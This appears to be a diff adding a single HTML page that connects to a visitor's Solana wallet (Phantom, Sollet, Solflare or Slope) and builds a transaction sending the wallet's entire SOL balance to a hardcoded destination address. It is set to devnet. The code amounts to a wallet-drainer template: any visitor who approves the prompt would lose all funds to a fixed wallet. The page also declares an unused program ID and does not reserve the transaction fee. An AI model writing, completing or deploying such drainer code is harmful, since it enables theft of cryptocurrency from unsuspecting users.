@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Send All SOL to Specified Wallet</title>
+    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.41.0/dist/index.iife.min.js"></script>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; }
+        button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+    <h1>Send All SOL to Specified Wallet</h1>
+    <button id="sendSolBtn">Send SOL</button>
+
+    <script>
+        // Create connection to Solana Devnet
+        const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('devnet'), 'confirmed');
+
+        // The Program ID (from your smart contract deployment)
+        const programId = new solanaWeb3.PublicKey('8qC5wC2AzneYSynLyGvnMWJbLqYFFkryfaDZYBi4t6s7');
+
+        // Destination wallet address (the one you provided)
+        const destinationWallet = new solanaWeb3.PublicKey('41iJSBqpFYd4ebLortr3uy3M1Phw19z6Ro6VqxocCj14');
+
+        // Button to trigger sending SOL
+        document.getElementById('sendSolBtn').addEventListener('click', async () => {
+            try {
+                // Check for various Solana wallets (Phantom, Sollet, Solflare, Slope, etc.)
+                let provider;
+
+                // Check if Phantom is available
+                if (window.solana && window.solana.isPhantom) {
+                    provider = window.solana;
+                }
+                // Check if Sollet is available
+                else if (window.sollet && window.sollet.isSollet) {
+                    provider = window.sollet;
+                }
+                // Check if Solflare is available
+                else if (window.solflare && window.solflare.isSolflare) {
+                    provider = window.solflare;
+                }
+                // Check if Slope is available
+                else if (window.slope && window.slope.isSlope) {
+                    provider = window.slope;
+                }
+                // If no wallet is available, prompt the user
+                else {
+                    alert('Please install a compatible Solana wallet (Phantom, Sollet, Solflare, or Slope).');
+                    return;
+                }
+
+                // Connect to the wallet
+                await provider.connect();
+
+                // Get the public key of the connected wallet
+                const senderPublicKey = provider.publicKey;
+
+                // Create the transaction to transfer all SOL to the specified destination
+                const transaction = new solanaWeb3.Transaction().add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: senderPublicKey,
+                        toPubkey: destinationWallet,
+                        lamports: await connection.getBalance(senderPublicKey), // Send all balance
+                    })
+                );
+
+                // Send the transaction to the blockchain
+                const signature = await provider.sendTransaction(transaction, connection);
+                console.log('Transaction sent with signature: ', signature);
+                alert('Transaction successfully sent!');
+            } catch (error) {
+                console.error(error);
+                alert('An error occurred while sending the transaction.');
+            }
+        });
+    </script>
+
+</body>
+</html>
